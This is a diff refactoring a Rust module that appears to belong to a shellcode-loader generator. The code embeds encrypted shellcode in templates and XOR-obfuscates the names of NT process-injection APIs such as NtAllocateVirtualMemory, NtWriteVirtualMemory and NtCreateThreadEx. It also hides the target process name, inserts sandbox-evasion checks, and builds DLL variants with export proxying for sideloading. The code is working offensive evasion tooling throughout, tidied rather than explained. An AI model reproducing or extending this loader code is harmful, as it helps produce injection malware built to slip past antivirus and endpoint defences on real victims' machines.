@@ -17,103 +17,41 @@ const OUTPUT_DIR: &str = "shared";
 const LITCRYPT_DEPENDENCY: &str = r#"litcrypt = "0.4""#;
 const LITCRYPT_SETUP: &str = "#[macro_use]\nextern crate litcrypt;\n\nuse_litcrypt!();";
 
-/// Build the dependencies string for Cargo.toml
-///
-/// # Arguments
-/// * `template_dependencies` - Optional additional dependencies from the encryption method
-///
-/// # Returns
-/// Complete dependencies string
 fn build_dependencies(template_dependencies: Option<String>) -> String {
     match template_dependencies {
-        Some(dependencies) if !dependencies.trim().is_empty() => {
-            format!("{}\n{}", LITCRYPT_DEPENDENCY, dependencies)
-        }
+        Some(deps) if !deps.trim().is_empty() => format!("{}\n{}", LITCRYPT_DEPENDENCY, deps),
         _ => LITCRYPT_DEPENDENCY.to_string(),
     }
 }
 
-/// Search and replace text in a file
-///
-/// # Arguments
-/// * `path_to_file` - Path to the file to modify
-/// * `search` - Text to search for
-/// * `replace` - Text to replace with
-///
-/// # Returns
-/// Result indicating success or failure
-fn search_and_replace(
-    path_to_file: &Path,
-    search: &str,
-    replace: &str,
-) -> Result<(), Box<dyn std::error::Error>> {
-    let file_content = fs::read_to_string(path_to_file)?;
-    let new_content = file_content.replace(search, replace);
-
-    let mut file = OpenOptions::new()
-        .write(true)
-        .truncate(true)
-        .open(path_to_file)?;
+fn search_and_replace(path: &Path, search: &str, replace: &str) -> Result<(), Box<dyn std::error::Error>> {
+    let content = fs::read_to_string(path)?;
+    let new_content = content.replace(search, replace);
+    let mut file = OpenOptions::new().write(true).truncate(true).open(path)?;
     file.write_all(new_content.as_bytes())?;
-
     Ok(())
 }
 
-/// Create a timestamped output folder
-///
-/// # Arguments
-/// * `parent` - Parent directory
-///
-/// # Returns
-/// Path to the created output folder
-fn create_root_folder(parent: &Path) -> Result<PathBuf, Box<dyn std::error::Error>> {
+fn create_output_folder() -> Result<PathBuf, Box<dyn std::error::Error>> {
     let timestamp = SystemTime::now().duration_since(UNIX_EPOCH)?.as_secs();
     let folder_name = format!("output_{}", timestamp);
     println!("[+] Creating output folder: {}", folder_name);
-
-    let result_path = parent.join(folder_name);
-    fs::create_dir(&result_path)?;
-
-    Ok(result_path)
+    let path = Path::new(OUTPUT_DIR).join(folder_name);
+    fs::create_dir(&path)?;
+    Ok(path)
 }
 
-/// Copy a template directory to the output location
-///
-/// # Arguments
-/// * `source` - Source template directory
-/// * `dest` - Destination directory
-///
-/// # Returns
-/// Result indicating success or failure
 fn copy_template(source: &Path, dest: &Path) -> Result<(), Box<dyn std::error::Error>> {
-    let options = CopyOptions {
-        content_only: true,
-        ..Default::default()
-    };
+    let options = CopyOptions { content_only: true, ..Default::default() };
     copy(source, dest, &options)?;
-
     Ok(())
 }
 
-/// Get the template path for a given execution method
-///
-/// # Arguments
-/// * `execution` - The execution method
-///
-/// # Returns
-/// Path to the template directory
-fn template_path_for_execution(execution: &Execution) -> PathBuf {
-    PathBuf::from(format!("templates/{}/.", execution.template_name()))
+fn get_template_path(execution: &Execution) -> PathBuf {
+    Path::new("templates").join(format!("{}/.", execution.template_name()))
 }
 
-/// Get the encrypted filename based on encryption method
-///
-/// # Arguments
-/// * `encryption` - The encryption method
-///
-/// # Returns
-/// Filename for the encrypted shellcode
-fn encrypted_filename(encryption: &Encryption) -> &'static str {
+fn get_encrypted_filename(encryption: &Encryption) -> &'static str {
     match encryption {
         Encryption::Xor => "input.xor",
         Encryption::Aes => "input.aes",
@@ -121,37 +59,17 @@ fn encrypted_filename(encryption: &Encryption) -> &'static str {
     }
 }
 
-/// Build the encrypted shellcode output
-///
-/// # Arguments
-/// * `order` - The configuration order
-/// * `src_dir` - Source directory for the output
-///
-/// # Returns
-/// Tuple of (EncryptionOutput, include_path)
 fn build_encrypted_output(order: &Order, src_dir: &Path) -> (crate::encryption::EncryptionOutput, String) {
-    let filename = encrypted_filename(&order.encryption);
+    let filename = get_encrypted_filename(&order.encryption);
     let path = src_dir.join(filename);
     let include_path = format!("\"{}\"", filename);
-
     let output = crate::encryption::encrypt_shellcode(&order.shellcode_path, &path, order.encryption);
-
     (output, include_path)
 }
 
-/// Build all replacements for the template
-///
-/// # Arguments
-/// * `order` - The configuration order
-/// * `src_dir` - Source directory for the output
-///
-/// # Returns
-/// HashMap of replacements to apply to the template
-fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, String> {
-    let (enc_output, include_path) = build_encrypted_output(order, src_dir);
+fn build_basic_replacements(enc_output: crate::encryption::EncryptionOutput, include_path: String) -> HashMap<&'static str, String> {
     let dependencies = build_dependencies(enc_output.dependencies);
-
-    let mut replacements: HashMap<&'static str, String> = HashMap::new();
+    let mut replacements = HashMap::new();
     replacements.insert("{{PATH_TO_SHELLCODE}}", include_path);
     replacements.insert("{{DECRYPTION_FUNCTION}}", enc_output.decryption_function);
     replacements.insert("{{MAIN}}", enc_output.main);
@@ -160,80 +78,47 @@ fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, St
     replacements.insert("{{LITCRYPT_SETUP}}", LITCRYPT_SETUP.to_string());
     replacements.insert("{{DLL_MAIN}}", String::new());
     replacements.insert("{{DLL_FORMAT}}", String::new());
-
-    // Obfuscate target process name
-    replacements.insert(
-        "{{TARGET_PROCESS}}",
-        obfuscate_string_for_template(&order.target_process),
-    );
-
-    replacements.insert("{{SANDBOX}}", String::new());
-    replacements.insert("{{SANDBOX_IMPORTS}}", String::new());
-
-    if let Some(ref domain) = order.sandbox {
-        let sandbox_output = build_sandbox(domain);
-        replacements.insert("{{SANDBOX}}", sandbox_output.sandbox_function);
-        replacements.insert("{{SANDBOX_IMPORTS}}", sandbox_output.sandbox_import);
-    }
-
-    let api_key = non_zero_random_key();
-    replacements.insert("{{API_KEY}}", format!("0x{:02x}", api_key));
-    replacements.insert(
-        "{{OBF_NT_OPEN_PROCESS}}",
-        obfuscate_api_name("NtOpenProcess", api_key),
-    );
-    replacements.insert(
-        "{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}}",
-        obfuscate_api_name("NtAllocateVirtualMemory", api_key),
-    );
-    replacements.insert(
-        "{{OBF_NT_WRITE_VIRTUAL_MEMORY}}",
-        obfuscate_api_name("NtWriteVirtualMemory", api_key),
-    );
-    replacements.insert(
-        "{{OBF_NT_PROTECT_VIRTUAL_MEMORY}}",
-        obfuscate_api_name("NtProtectVirtualMemory", api_key),
-    );
-    replacements.insert(
-        "{{OBF_NT_CREATE_THREAD_EX}}",
-        obfuscate_api_name("NtCreateThreadEx", api_key),
-    );
-    replacements.insert(
-        "{{OBF_NT_QUEUE_APC_THREAD}}",
-        obfuscate_api_name("NtQueueApcThread", api_key),
-    );
-    replacements.insert(
-        "{{OBF_NT_TEST_ALERT}}",
-        obfuscate_api_name("NtTestAlert", api_key),
-    );
-    replacements.insert(
-        "{{OBF_NT_DELAY_EXECUTION}}",
-        obfuscate_api_name("NtDelayExecution", api_key),
-    );
-
     replacements
 }
 
-/// Apply DLL format to the template
-///
-/// # Arguments
-/// * `replacements` - HashMap of replacements to update
-/// * `main_rs_path` - Path to the main.rs file
-/// * `is_proxy` - Whether this is a proxy DLL
-///
-/// # Returns
-/// Path to the target file (lib.rs for DLL, main.rs for EXE)
-fn apply_dll_format(
-    replacements: &mut HashMap<&'static str, String>,
-    main_rs_path: &Path,
-    is_proxy: bool,
-) -> PathBuf {
-    let dll_cargo_conf = r#"
-    [lib]
-    crate-type = ["cdylib"]"#;
-    replacements.insert("{{DLL_FORMAT}}", dll_cargo_conf.to_string());
+fn add_target_process_replacement(replacements: &mut HashMap<&'static str, String>, target: &str) {
+    replacements.insert("{{TARGET_PROCESS}}", obfuscate_string_for_template(target));
+}
 
-    let dll_main_fn = if is_proxy {
+fn add_sandbox_replacements(replacements: &mut HashMap<&'static str, String>, domain: &str) {
+    let sandbox_output = build_sandbox(domain);
+    replacements.insert("{{SANDBOX}}", sandbox_output.sandbox_function);
+    replacements.insert("{{SANDBOX_IMPORTS}}", sandbox_output.sandbox_import);
+}
+
+fn add_api_obfuscation_replacements(replacements: &mut HashMap<&'static str, String>) {
+    let key = non_zero_random_key();
+    replacements.insert("{{API_KEY}}", format!("0x{:02x}", key));
+    replacements.insert("{{OBF_NT_OPEN_PROCESS}}", obfuscate_api_name("NtOpenProcess", key));
+    replacements.insert("{{OBF_NT_ALLOCATE_VIRTUAL_MEMORY}}", obfuscate_api_name("NtAllocateVirtualMemory", key));
+    replacements.insert("{{OBF_NT_WRITE_VIRTUAL_MEMORY}}", obfuscate_api_name("NtWriteVirtualMemory", key));
+    replacements.insert("{{OBF_NT_PROTECT_VIRTUAL_MEMORY}}", obfuscate_api_name("NtProtectVirtualMemory", key));
+    replacements.insert("{{OBF_NT_CREATE_THREAD_EX}}", obfuscate_api_name("NtCreateThreadEx", key));
+    replacements.insert("{{OBF_NT_QUEUE_APC_THREAD}}", obfuscate_api_name("NtQueueApcThread", key));
+    replacements.insert("{{OBF_NT_TEST_ALERT}}", obfuscate_api_name("NtTestAlert", key));
+    replacements.insert("{{OBF_NT_DELAY_EXECUTION}}", obfuscate_api_name("NtDelayExecution", key));
+}
+
+fn build_replacements(order: &Order, src_dir: &Path) -> HashMap<&'static str, String> {
+    let (enc_output, include_path) = build_encrypted_output(order, src_dir);
+    let mut replacements = build_basic_replacements(enc_output, include_path);
+    add_target_process_replacement(&mut replacements, &order.target_process);
+    
+    if let Some(ref domain) = order.sandbox {
+        add_sandbox_replacements(&mut replacements, domain);
+    }
+    
+    add_api_obfuscation_replacements(&mut replacements);
+    replacements
+}
+
+fn build_dll_main_function(is_proxy: bool) -> String {
+    if is_proxy {
         r#"
     const DLL_PROCESS_ATTACH: u32 = 1;
     const DLL_PROCESS_DETACH: u32 = 0;
@@ -256,8 +141,7 @@ fn apply_dll_format(
         }
 
         true
-    }
-    "#
+    }"#.to_string()
     } else {
         r#"
     const DLL_PROCESS_ATTACH: u32 = 1;
@@ -280,84 +164,58 @@ fn apply_dll_format(
         true
     }
     #[no_mangle]
-    pub extern "C" fn DllRegisterServer() {{
-        main()
-    }}
+    pub extern "C" fn DllRegisterServer() { main() }
     #[no_mangle]
-    pub extern "C" fn DllGetClassObject() {{
-        main()
-    }}
+    pub extern "C" fn DllGetClassObject() { main() }
     #[no_mangle]
-    pub extern "C" fn DllUnregisterServer() {{
-        main()
-    }}
+    pub extern "C" fn DllUnregisterServer() { main() }
     #[no_mangle]
-    pub extern "C" fn Run() {{
-        main()
-    }}
-    "#
-    };
-    replacements.insert("{{DLL_MAIN}}", dll_main_fn.to_string());
+    pub extern "C" fn Run() { main() }"#.to_string()
+    }
+}
+
+fn apply_dll_format(
+    replacements: &mut HashMap<&'static str, String>,
+    main_rs_path: &Path,
+    is_proxy: bool,
+) -> PathBuf {
+    let dll_config = "\n[lib]\ncrate-type = [\"cdylib\"]";
+    replacements.insert("{{DLL_FORMAT}}", dll_config.to_string());
+    replacements.insert("{{DLL_MAIN}}", build_dll_main_function(is_proxy));
 
     let lib_rs_path = main_rs_path.with_file_name("lib.rs");
-    if let Err(e) = fs::rename(main_rs_path, &lib_rs_path) {
-        eprintln!("[-] Error while renaming main.rs to lib.rs: {}", e);
+    fs::rename(main_rs_path, &lib_rs_path).unwrap_or_else(|e| {
+        eprintln!("[-] Error renaming main.rs to lib.rs: {}", e);
         exit(1);
-    }
-
+    });
     lib_rs_path
 }
 
-/// Apply all replacements to the template files
-///
-/// # Arguments
-/// * `replacements` - HashMap of replacements to apply
-/// * `main_path` - Path to the main source file
-/// * `cargo_path` - Path to the Cargo.toml file
 fn apply_replacements(replacements: &HashMap<&str, String>, main_path: &Path, cargo_path: &Path) {
     for (key, value) in replacements {
-        search_and_replace(main_path, key, value)
-            .unwrap_or_else(|e| eprintln!("Warning: template replace failed for {}: {}", key, e));
-        search_and_replace(cargo_path, key, value)
-            .unwrap_or_else(|e| eprintln!("Warning: cargo replace failed for {}: {}", key, e));
+        let _ = search_and_replace(main_path, key, value)
+            .map_err(|e| eprintln!("Warning: template replace failed for {}: {}", key, e));
+        let _ = search_and_replace(cargo_path, key, value)
+            .map_err(|e| eprintln!("Warning: cargo replace failed for {}: {}", key, e));
     }
 }
 
-/// Find the position to insert the proxy module
-///
-/// # Arguments
-/// * `existing` - Existing file content
-///
-/// # Returns
-/// Byte offset where to insert the proxy module
-fn proxy_module_insert_offset(existing: &str) -> usize {
-    if let Some(pos) = existing.find("use_litcrypt!();") {
-        let after_marker = pos + "use_litcrypt!();".len();
-        return after_marker
-            + existing[after_marker..]
-                .find('\n')
-                .map(|newline| newline + 1)
-                .unwrap_or(0);
-    }
-
-    let mut inner_attr_end = 0;
-    for line in existing.lines() {
-        let trimmed = line.trim();
-        if trimmed.starts_with("#!") || trimmed.is_empty() {
-            inner_attr_end += line.len() + 1;
-        } else {
-            break;
-        }
-    }
-    inner_attr_end.min(existing.len())
+fn find_proxy_insert_position(content: &str) -> usize {
+    content.find("use_litcrypt!();")
+        .map(|pos| {
+            let after = pos + "use_litcrypt!();".len();
+            content[after..].find('\n').map(|n| after + n + 1).unwrap_or(after)
+        })
+        .unwrap_or_else(|| {
+            content.lines()
+                .take_while(|line| line.trim().starts_with("#!") || line.trim().is_empty())
+                .map(|l| l.len() + 1)
+                .sum::<usize>()
+                .min(content.len())
+        })
 }
 
-/// Apply proxy DLL configuration
-///
-/// # Arguments
-/// * `order` - The configuration order
-/// * `folder` - Output folder path
-fn apply_proxy(order: &Order, folder: &Path) {
+fn apply_proxy_config(order: &Order, folder: &Path) {
     let proxy_path = order.proxy_dll.as_ref().unwrap();
     let exports = crate::pe_parser::parse_exports(proxy_path).unwrap_or_else(|e| {
         eprintln!("[-] Failed to parse proxy DLL exports: {}", e);
@@ -372,18 +230,17 @@ fn apply_proxy(order: &Order, folder: &Path) {
     let proxy_output = crate::dll_proxy::generate_proxy(&exports, &stem);
 
     let src_dir = folder.join("src");
-    fs::write(src_dir.join("proxy.rs"), &proxy_output.proxy_source)
-        .expect("Failed to write proxy.rs");
+    fs::write(src_dir.join("proxy.rs"), &proxy_output.proxy_source).unwrap();
 
     let lib_rs_path = src_dir.join("lib.rs");
-    let existing = fs::read_to_string(&lib_rs_path).expect("Failed to read lib.rs");
-    let insert_at = proxy_module_insert_offset(&existing);
+    let content = fs::read_to_string(&lib_rs_path).unwrap();
+    let insert_pos = find_proxy_insert_position(&content);
     let updated = format!(
         "{}\n#[allow(non_upper_case_globals, non_snake_case)]\nmod proxy;\n{}",
-        existing[..insert_at].trim_end(),
-        &existing[insert_at..]
+        &content[..insert_pos],
+        &content[insert_pos..]
     );
-    fs::write(&lib_rs_path, updated).expect("Failed to update lib.rs with mod proxy");
+    fs::write(&lib_rs_path, updated).unwrap();
 
     println!(
         "[+] DLL proxying: {} exports forwarded. Rename the original DLL to '{}'",
@@ -392,18 +249,12 @@ fn apply_proxy(order: &Order, folder: &Path) {
     );
 }
 
-/// Main function to assemble the Rust code for the loader
-///
-/// # Arguments
-/// * `order` - The configuration order
-///
-/// # Returns
-/// Path to the output folder containing the generated Rust code
+/// Generate Rust loader code from order configuration
 pub fn assemble(order: Order) -> PathBuf {
     println!("[+] Assembling Rust code..");
 
-    let template_path = template_path_for_execution(&order.execution);
-    let folder = create_root_folder(Path::new(OUTPUT_DIR)).expect("Failed to create output folder");
+    let template_path = get_template_path(&order.execution);
+    let folder = create_output_folder().expect("Failed to create output folder");
     copy_template(&template_path, &folder).expect("Failed to copy template");
 
     let src_dir = folder.join("src");
@@ -421,7 +272,7 @@ pub fn assemble(order: Order) -> PathBuf {
     apply_replacements(&replacements, &target_file, &cargo_toml);
 
     if is_proxy {
-        apply_proxy(&order, &folder);
+        apply_proxy_config(&order, &folder);
     }
 
     println!("[+] Done assembling Rust code!");
@@ -432,10 +283,9 @@ pub fn assemble(order: Order) -> PathBuf {
 mod tests {
     use super::*;
     use crate::config::{Encryption, Execution, Format};
-    use std::path::PathBuf;
 
     #[test]
-    fn test_build_dependencies_always_includes_litcrypt() {
+    fn test_build_dependencies() {
         assert_eq!(build_dependencies(None), r#"litcrypt = "0.4""#);
         assert_eq!(
             build_dependencies(Some(r#"libaes = "0.7""#.to_string())),
@@ -444,23 +294,58 @@ mod tests {
     }
 
     #[test]
-    fn test_template_path_for_execution() {
-        let path = template_path_for_execution(&Execution::NtCreateRemoteThread);
+    fn test_get_template_path() {
+        let path = get_template_path(&Execution::NtCreateRemoteThread);
         assert!(path.to_string_lossy().contains("templates/ntCRT"));
     }
 
     #[test]
-    fn test_encrypted_filename() {
-        assert_eq!(encrypted_filename(&Encryption::Xor), "input.xor");
-        assert_eq!(encrypted_filename(&Encryption::Aes), "input.aes");
-        assert_eq!(encrypted_filename(&Encryption::Uuid), "input.uuid");
+    fn test_get_encrypted_filename() {
+        assert_eq!(get_encrypted_filename(&Encryption::Xor), "input.xor");
+        assert_eq!(get_encrypted_filename(&Encryption::Aes), "input.aes");
+        assert_eq!(get_encrypted_filename(&Encryption::Uuid), "input.uuid");
     }
 
     #[test]
-    fn test_proxy_module_insert_offset_keeps_litcrypt_first() {
+    fn test_build_basic_replacements() {
+        let enc_output = crate::encryption::EncryptionOutput {
+            decryption_function: "fn dec()".to_string(),
+            main: "main()".to_string(),
+            dependencies: Some("dep = \"1.0\"".to_string()),
+            imports: Some("use std::;".to_string()),
+        };
+        let replacements = build_basic_replacements(enc_output, "input.xor".to_string());
+        assert!(replacements.contains_key("{{PATH_TO_SHELLCODE}}"));
+        assert!(replacements.contains_key("{{DECRYPTION_FUNCTION}}"));
+    }
+
+    #[test]
+    fn test_add_target_process_replacement() {
+        let mut replacements = HashMap::new();
+        add_target_process_replacement(&mut replacements, "notepad.exe");
+        assert!(replacements.contains_key("{{TARGET_PROCESS}}"));
+    }
+
+    #[test]
+    fn test_add_api_obfuscation_replacements() {
+        let mut replacements = HashMap::new();
+        add_api_obfuscation_replacements(&mut replacements);
+        assert!(replacements.contains_key("{{API_KEY}}"));
+        assert!(replacements.contains_key("{{OBF_NT_OPEN_PROCESS}}"));
+    }
+
+    #[test]
+    fn test_build_dll_main_function() {
+        let proxy_main = build_dll_main_function(true);
+        let non_proxy_main = build_dll_main_function(false);
+        assert!(proxy_main.contains("proxy::init()"));
+        assert!(!non_proxy_main.contains("proxy::init()"));
+    }
+
+    #[test]
+    fn test_find_proxy_insert_position() {
         let source = "#![windows_subsystem = \"windows\"]\n\n#[macro_use]\nextern crate litcrypt;\n\nuse_litcrypt!();\n\nuse std::include_bytes;\n";
-        let insert_at = proxy_module_insert_offset(source);
-        assert!(source[..insert_at].contains("use_litcrypt!();"));
-        assert!(source[insert_at..].starts_with('\n'));
+        let pos = find_proxy_insert_position(source);
+        assert!(source[..pos].contains("use_litcrypt!();"));
     }
 }
